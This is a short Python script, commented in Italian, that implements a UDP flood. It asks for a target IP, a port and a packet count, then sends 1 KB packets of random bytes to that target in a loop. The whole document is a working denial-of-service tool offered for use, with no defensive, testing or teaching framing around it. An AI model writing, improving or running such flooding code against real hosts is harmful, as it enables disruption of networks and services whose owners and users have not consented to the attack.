import socket
import random

def udp_flood (ip_target, porta_target, num_pacchetti):
    # Creazione di un socket UDP
    udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    # Generazione di un pacchetto da 1 KB con dati casuali
    dati_pacchetto = random.randbytes(1024)
    
    # Invio dei pacchetti specificati
    for x in range(num_pacchetti):
        udp_socket.sendto(dati_pacchetto, (ip_target, porta_target))
    
    # Chiusura del socket dopo l'invio
    udp_socket.close()

if __name__ == "__main__":
    # Inserimento dell'IP e della porta target
    ip_target = input("Inserire l'IP del target: ")
    porta_target = int(input("Inserire la porta del target: "))
    
    # Numero di pacchetti da inviare
    num_pacchetti = int(input("Inserire il numero di pacchetti da inviare: "))
    
    # Chiamata alla funzione di udp_flood
    udp_flood (ip_target, porta_target, num_pacchetti)
